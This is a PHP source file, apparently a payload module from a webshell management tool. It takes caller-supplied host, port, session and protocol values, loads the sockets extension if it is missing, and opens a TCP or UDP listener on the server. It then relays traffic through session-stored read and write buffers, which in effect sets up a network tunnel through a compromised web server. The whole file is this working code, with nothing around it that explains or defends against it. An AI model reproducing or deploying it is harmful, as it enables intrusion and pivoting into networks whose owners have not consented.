<?php
/**
 * global: $rhost, $rport, $sessionid, $schema
 * 
 * $ret['code']:
 *      1   成功返回
 *      0   远程无socket库
 *      -1  socket操作失败
 */
ini_set("session.use_trans_sid" ,0);
ini_set("session.use_only_cookies" ,0);
ini_set("session.use_cookies" ,0);
set_time_limit(0);

function run($vars){
    extract($vars);
    session_id($sessionid);
    $ret = array('code'=>1, 'msg'=>'');
    session_start();
    $_SESSION['run'] = 0;
    $_SESSION['readbuf'] = '';
    $_SESSION['writebuf'] = '';
    session_write_close();
    register_shutdown_function(function(){
        unset($_SESSION);
        session_destroy();
    });

    if(!extension_loaded('sockets')){
        if(function_exists('dl')){
            $prefix = (PHP_SHLIB_SUFFIX === 'dll')?'php_':'';
            if(!dl($prefix.'sockets'.PHP_SHLIB_SUFFIX)){
                $ret['code'] = 0;
                return json_encode($ret);
            }
        }else{
            $ret['code'] = 0;
            return json_encode($ret);
        }
    }
    $flag = STREAM_SERVER_BIND;
    if($schema == "tcp") {
        $flag = STREAM_SERVER_BIND|STREAM_SERVER_LISTEN;
    }
    if(($server = stream_socket_server("{$schema}://{$rhost}:{$rport}", $err_code, $err_msg, $flag)) === false){
        $ret['code'] = -1;
        $ret['msg'] = base64_encode("socket init failed: reason: " . $err_msg);
        return json_encode($ret);
    }
    socket_set_blocking($server, false);
    if($schema == 'tcp'){
        while (($sock = stream_socket_accept($server)) === false) {
            session_start();
            $tmp = $_SESSION['run'];
            session_write_close();
            if($tmp !== 0){
                @stream_socket_shutdown($server, STREAM_SHUT_RDWR);
                @fclose($server);
                return json_encode($ret);
            }
            usleep(100000);
        }
    }else{
        $sock = $server;
    }
    // @stream_socket_shutdown($server, STREAM_SHUT_RDWR);
    // @fclose($server);
    session_start();
    $_SESSION['run'] = true;
    session_write_close();
    stream_set_blocking($sock, false);
    $peeraddr = '';//保存udp远程地址
    while($_SESSION['run'] === true){
        $readbuf = '';
        while(true){
            if($schema=='tcp')
                $tmp = fread($sock, 1024);
            else
                $tmp = stream_socket_recvfrom($sock, 1024, 0, $peeraddr);
            if($tmp == ''){
                break;
            }
            $readbuf .= $tmp;
        }
        if($readbuf != ''){
            session_start();
            $_SESSION['readbuf'] .= $readbuf;
            session_write_close();
        }
    
        session_start();
        $writebuf = $_SESSION['writebuf'];
        $_SESSION['writebuf'] = '';
        session_write_close();
        if($writebuf != ''){
            if($schema=='tcp')
                $tmp = fwrite($sock, $writebuf);
            else
                $tmp = stream_socket_sendto($sock, $writebuf, 0, $peeraddr);
            if($tmp === false){
                break;
            }
        }
        usleep(100000);
    }
    @fclose($sock);
    @stream_socket_shutdown($server, STREAM_SHUT_RDWR);
    @fclose($server);
    return json_encode($ret);
}